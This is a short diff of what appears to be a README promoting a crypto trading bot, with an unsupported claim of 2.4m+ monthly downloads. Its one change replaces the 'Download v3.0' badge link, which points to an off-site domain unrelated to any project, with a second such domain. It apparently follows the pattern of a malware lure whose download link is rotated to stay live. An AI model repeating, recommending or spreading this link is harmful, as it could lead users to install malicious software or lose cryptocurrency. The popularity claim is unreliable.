@@ -49,7 +49,7 @@ A: Yes — checks contract, liquidity, and dev wallet before buying.
 
 **Monthly downloads:** 2.4m+
 
-[![Download](https://img.shields.io/badge/Download-v3.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/gmgnbot19)
+[![Download](https://img.shields.io/badge/Download-v3.0-brightgreen?style=for-the-badge)](https://dllvcrun.com/gmgnbot19)
 
 ---
 
